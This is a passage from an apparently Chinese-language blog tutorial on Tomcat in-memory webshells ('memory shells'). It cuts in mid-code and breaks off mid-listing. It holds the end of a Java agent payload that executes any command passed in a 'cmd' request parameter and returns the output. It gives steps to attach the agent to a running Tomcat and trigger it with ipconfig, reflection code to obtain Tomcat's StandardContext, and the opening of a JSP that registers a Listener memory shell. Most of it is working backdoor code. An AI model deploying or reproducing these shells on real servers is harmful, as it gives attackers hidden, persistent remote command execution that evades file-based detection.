class="string">&quot;exec&quot;</span>))</span><br><span class="line">				&#123;</span><br><span class="line">					String cmd=request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">					<span class="keyword">if</span> (cmd != <span class="keyword">null</span> &amp;&amp; cmd.length() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">						Process p = Runtime.getRuntime().exec(cmd);</span><br><span class="line">						java.io.OutputStream os = p.getOutputStream();</span><br><span class="line">						java.io.InputStream in = p.getInputStream();</span><br><span class="line">						java.io.DataInputStream dis = <span class="keyword">new</span> java.io.DataInputStream(in);</span><br><span class="line">						String disr = dis.readLine();</span><br><span class="line">						<span class="keyword">while</span> (disr != <span class="keyword">null</span>) &#123;</span><br><span class="line">							result = result + disr + <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">							disr = dis.readLine();</span><br><span class="line">						&#125;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">				response.getWriter().print(result);</span><br><span class="line">				<span class="keyword">return</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">catch</span>(Exception e)</span><br><span class="line">		&#123;</span><br><span class="line">			response.getWriter().print(e.getMessage());</span><br><span class="line">		&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>3、编译成AgentMain.jar，使用解压软件打开jar包，将source.txt复杂到jar包内</p>
<p><img src="image-20220228165742735.png" alt="image-20220228165742735"></p>
<p>4、启动tomcat，然后启动attachmain</p>
<p><img src="image-20220228170020689.png" alt="image-20220228170020689"></p>
<p><img src="image-20220228170043181.png" alt="image-20220228170043181"></p>
<p><img src="image-20220228170058171.png" alt="image-20220228170058171"></p>
<p>5、访问任意路由，带上这些参数pass=self&amp;model=exec&amp;cmd=ipconfig</p>
<p><img src="image-20220228170342553.png" alt="image-20220228170342553"></p>
<h3 id="获取StandardContext对象"><a href="#获取StandardContext对象" class="headerlink" title="获取StandardContext对象"></a>获取StandardContext对象</h3><p>参考：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9914">https://xz.aliyun.com/t/9914</a></p>
<p>servlet规范型内存马是动态注册符合servlet规范的自定义恶意组件到web容器中，servlet规范型内存马都是基于修改<code>StandardContext</code>实现的。</p>
<p>bitterz师傅将获取StandardContext对象的方法总结在了一起，我这里仅展示实现代码，详情查看<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9914">https://xz.aliyun.com/t/9914</a></p>
<p>1、从request对象可以获取servletContext再一步一步获取standardContext。（需要request）</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">javax.servlet.ServletContext servletContext = request.getServletContext();对象</span><br><span class="line"></span><br><span class="line">Field appctx = servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);  <span class="comment">// 获取属性</span></span><br><span class="line">appctx.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);  <span class="comment">//从servletContext中获取context属性-&gt;applicationContext</span></span><br><span class="line"></span><br><span class="line">Field stdctx = applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);  <span class="comment">// 获取属性</span></span><br><span class="line">stdctx.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);  <span class="comment">// 从applicationContext中获取context属性-&gt;standardContext，applicationContext构造时需要传入standardContext</span></span><br></pre></td></tr></table></figure>

<p>2、从ContextClassLoader获取servletContext（限制在于只可用于Tomcat 8 9）</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">org.apache.catalina.loader.WebappClassLoaderBase webappClassLoaderBase =(org.apache.catalina.loader.WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();</span><br><span class="line"></span><br><span class="line">StandardContext standardContext = (StandardContext)webappClassLoaderBase.getResources().getContext();			</span><br></pre></td></tr></table></figure>

<p>3、遍历<code>thread</code>数组获取servletContext（Tomcat全版本）</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span>%&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardEngine&quot;</span>%&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardHost&quot;</span>%&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span>%&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.HashMap&quot;</span>%&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Iterator&quot;</span>%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Tomcat6789</span> </span>&#123;</span><br><span class="line">    String uri;</span><br><span class="line">    String serverName;</span><br><span class="line">    StandardContext standardContext;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">getField</span><span class="params">(Object object, String fieldName)</span> </span>&#123;</span><br><span class="line">        Field declaredField;</span><br><span class="line">        Class clazz = object.getClass();</span><br><span class="line">        <span class="keyword">while</span> (clazz != Object.class) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">                declaredField = clazz.getDeclaredField(fieldName);</span><br><span class="line">                declaredField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                <span class="keyword">return</span> declaredField.get(object);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NoSuchFieldException e)&#123;&#125;</span><br><span class="line">            <span class="keyword">catch</span> (IllegalAccessException e)&#123;&#125;</span><br><span class="line">            clazz = clazz.getSuperclass();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Tomcat6789</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        Thread[] threads = (Thread[]) <span class="keyword">this</span>.getField(Thread.currentThread().getThreadGroup(), <span class="string">&quot;threads&quot;</span>);</span><br><span class="line">        Object object;</span><br><span class="line">        <span class="keyword">for</span> (Thread thread : threads) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (thread == <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (thread.getName().contains(<span class="string">&quot;exec&quot;</span>)) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            Object target = <span class="keyword">this</span>.getField(thread, <span class="string">&quot;target&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (!(target <span class="keyword">instanceof</span> Runnable)) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                object = getField(getField(getField(target, <span class="string">&quot;this$0&quot;</span>), <span class="string">&quot;handler&quot;</span>), <span class="string">&quot;global&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (object == <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            java.util.ArrayList processors = (java.util.ArrayList) getField(object, <span class="string">&quot;processors&quot;</span>);</span><br><span class="line">            Iterator iterator = processors.iterator();</span><br><span class="line">            <span class="keyword">while</span> (iterator.hasNext()) &#123;</span><br><span class="line">                Object next = iterator.next();</span><br><span class="line"></span><br><span class="line">                Object req = getField(next, <span class="string">&quot;req&quot;</span>);</span><br><span class="line">                Object serverPort = getField(req, <span class="string">&quot;serverPort&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> (serverPort.equals(-<span class="number">1</span>))&#123;<span class="keyword">continue</span>;&#125;</span><br><span class="line">                org.apache.tomcat.util.buf.MessageBytes serverNameMB = (org.apache.tomcat.util.buf.MessageBytes) getField(req, <span class="string">&quot;serverNameMB&quot;</span>);</span><br><span class="line">                <span class="keyword">this</span>.serverName = (String) getField(serverNameMB, <span class="string">&quot;strValue&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">this</span>.serverName == <span class="keyword">null</span>)&#123;</span><br><span class="line">                    <span class="keyword">this</span>.serverName = serverNameMB.toString();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">this</span>.serverName == <span class="keyword">null</span>)&#123;</span><br><span class="line">                    <span class="keyword">this</span>.serverName = serverNameMB.getString();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                org.apache.tomcat.util.buf.MessageBytes uriMB = (org.apache.tomcat.util.buf.MessageBytes) getField(req, <span class="string">&quot;uriMB&quot;</span>);</span><br><span class="line">                <span class="keyword">this</span>.uri = (String) getField(uriMB, <span class="string">&quot;strValue&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">this</span>.uri == <span class="keyword">null</span>)&#123;</span><br><span class="line">                    <span class="keyword">this</span>.uri = uriMB.toString();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">this</span>.uri == <span class="keyword">null</span>)&#123;</span><br><span class="line">                    <span class="keyword">this</span>.uri = uriMB.getString();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">this</span>.getStandardContext();</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">getStandardContext</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        Thread[] threads = (Thread[]) <span class="keyword">this</span>.getField(Thread.currentThread().getThreadGroup(), <span class="string">&quot;threads&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (Thread thread : threads) &#123;</span><br><span class="line">            <span class="keyword">if</span> (thread == <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ((thread.getName().contains(<span class="string">&quot;Acceptor&quot;</span>)) &amp;&amp; (thread.getName().contains(<span class="string">&quot;http&quot;</span>))) &#123;</span><br><span class="line">                Object target = <span class="keyword">this</span>.getField(thread, <span class="string">&quot;target&quot;</span>);</span><br><span class="line">                HashMap children;</span><br><span class="line">                Object jioEndPoint = <span class="keyword">null</span>;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    jioEndPoint = getField(target, <span class="string">&quot;this$0&quot;</span>);</span><br><span class="line">                &#125;<span class="keyword">catch</span> (Exception e)&#123;&#125;</span><br><span class="line">                <span class="keyword">if</span> (jioEndPoint == <span class="keyword">null</span>)&#123;</span><br><span class="line">                    <span class="keyword">try</span>&#123;</span><br><span class="line">                        jioEndPoint = getField(target, <span class="string">&quot;endpoint&quot;</span>);</span><br><span class="line">                    &#125;<span class="keyword">catch</span> (Exception e)&#123; <span class="keyword">return</span>; &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                Object service = getField(getField(getField(getField(getField(jioEndPoint, <span class="string">&quot;handler&quot;</span>), <span class="string">&quot;proto&quot;</span>), <span class="string">&quot;adapter&quot;</span>), <span class="string">&quot;connector&quot;</span>), <span class="string">&quot;service&quot;</span>);</span><br><span class="line">                StandardEngine engine = <span class="keyword">null</span>;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    engine = (StandardEngine) getField(service, <span class="string">&quot;container&quot;</span>);</span><br><span class="line">                &#125;<span class="keyword">catch</span> (Exception e)&#123;&#125;</span><br><span class="line">                <span class="keyword">if</span> (engine == <span class="keyword">null</span>)&#123;</span><br><span class="line">                    engine = (StandardEngine) getField(service, <span class="string">&quot;engine&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                children = (HashMap) getField(engine, <span class="string">&quot;children&quot;</span>);</span><br><span class="line">                StandardHost standardHost = (StandardHost) children.get(<span class="keyword">this</span>.serverName);</span><br><span class="line"></span><br><span class="line">                children = (HashMap) getField(standardHost, <span class="string">&quot;children&quot;</span>);</span><br><span class="line">                Iterator iterator = children.keySet().iterator();</span><br><span class="line">                <span class="keyword">while</span> (iterator.hasNext())&#123;</span><br><span class="line">                    String contextKey = (String) iterator.next();</span><br><span class="line">                    <span class="keyword">if</span> (!(<span class="keyword">this</span>.uri.startsWith(contextKey)))&#123;<span class="keyword">continue</span>;&#125;</span><br><span class="line">                    StandardContext standardContext = (StandardContext) children.get(contextKey);</span><br><span class="line">                    <span class="keyword">this</span>.standardContext = standardContext;</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> StandardContext <span class="title">getSTC</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.standardContext;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line"><span class="comment">//获取StandardContext对象</span></span><br><span class="line">Tomcat6789 a = <span class="keyword">new</span> Tomcat6789();</span><br><span class="line">StandardContext standardContext = a.getSTC()</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>



<h3 id="Listener内存马实现"><a href="#Listener内存马实现" class="headerlink" title="Listener内存马实现"></a>Listener内存马实现</h3><p>Listener内存马实现非常简单，只需调用addApplicationEventListener方法注入一个listener对象即可</p>
<ol>
<li>获取StandardContext对象</li>
<li>构造listener对象</li>
<li>将listener添加到初始化的应用程序事件侦听器列表的末尾</li>
</ol>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span>%&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardEngine&quot;</span>%&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardHost&quot;</span>%&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span>%&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.HashMap&quot;</span>%&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Iterator&quot;</span>%&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Scanner&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.PrintWriter&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Tomcat6789</span> </span>&#123;</span><br><span class="line">    String uri;</span><br><span class="line">    String serverName;</span><br><span class="line">    StandardContext standardContext;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">getField</span><span class="params">(Object object, String fieldName)</span> </span>&#123;</span><br><span class="line">        Field declaredField;</span><br><span class="line">        Class clazz = object.getClass();</span><br><span class="line">        <span class="keyword">while</span> (clazz != Object.class) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">                declaredField = clazz.getDeclaredField(fieldName);</span><br><span class="line">                declaredField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                <span class="keyword">return</span> declaredField.get(object);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NoSuchFieldException e)&#123;&#125;</span><br><span class="line">            <span class="keyword">catch</span> (IllegalAccessException e)&#123;&#125;</span><br><span class="line">            clazz = clazz.getSuperclass();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Tomcat6789</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        Thread[] threads = (Thread[]) <span class="keyword">this</span>.getField(Thread.currentThread().getThreadGroup(), <span class="string">&quot;threads&quot;</span>);</span><br><span class="line">        Object object;</span><br><span class="line">        <span class="keyword">for</span> (Thread thread : threads) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (thread == <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (thread.getName().contains(<span class="string">&quot;exec&quot;</span>)) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            Object target = <span class="keyword">this</span>.getField(thread, <span class="string">&quot;target&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (!(target <span class="keyword">instanceof</span> Runnable)) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                object = getField(getField(getField(target, <span class="string">&quot;this$0&quot;</span>), <span class="string">&quot;handler&quot;</span>), <span class="string">&quot;global&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (object == <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            java.util.ArrayList processors = (java.util.ArrayList) getField(object, <span class="string">&quot;processors&quot;</span>);</span><br><span class="line">            Iterator iterator = processors.iterator();</span><br><span class="line">            <span class="keyword">while</span> (iterator.hasNext()) &#123;</span><br><span class="line">                Object next = iterator.next();</span><br><span class="line"></span><br><span class="line">                Object req = getField(next, <span class="string">&quot;req&quot;</span>);</span><br><span class="line">                Object serverPort = getField(req, <span class="string">&quot;serverPort&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> (serverPort.equals(-<span class="number">1</span>))&#123;<span class="keyword">continue</span>;&#125;</span><br><span class="line">                org.apache.tomcat.util.buf.MessageBytes serverNameMB = (org.apache.tomcat.util.buf.MessageBytes) getField(req, <span class="string">&quot;serverNameMB&quot;</span>);</span><br><span class="line">                <span class="keyword">this</span>.serverName = (String) getField(serverNameMB, <span class="string">&quot;strValue&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">this</span>.serverName == <span class="keyword">null</span>)&#123;</span><br><span class="line">                    <span class="keyword">this</span>.serverName = serverNameMB.toString();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">this</span>.serverName == <span class="keyword">null</span>)&#123;</span><br><span class="line">                    <span class="keyword">this</span>.serverName = serverNameMB.getString();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                org.apache.tomcat.util.buf.MessageBytes uriMB = (org.apache.tomcat.util.buf.MessageBytes) getField(req, <span class="string">&quot;uriMB&quot;</span>);</span><br><span class="line">                <span class="keyword">this</span>.uri = (String) getField(uriMB, <span class="string">&quot;strValue&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">this</span>.uri == <span class="keyword">null</span>)&#123;</span><br><span class="line">                    <span class="keyword">this</span>.uri = uriMB.toString();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">this</span>.uri == <span class="keyword">null</span>)&#123;</span><br><span class="line">                    <span class="keyword">this</span>.uri = uriMB.getString();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">this</span>.getStandardContext();</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">getStandardContext</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        Thread[] threads = (Thread[]) <span class="keyword">this</span>.getField(Thread.currentThread().getThreadGroup(), <span class="string">&quot;threads&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (Thread thread : threads) &#123;</span><br><span class="line">            <span class="keyword">if</span> (thread == <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ((thread.getName().contains(<span class="string">&quot;Acceptor&quot;</span>)) &amp;&amp; (thread.getName().contains(<span class="string">&quot;http&quot;</span>))) 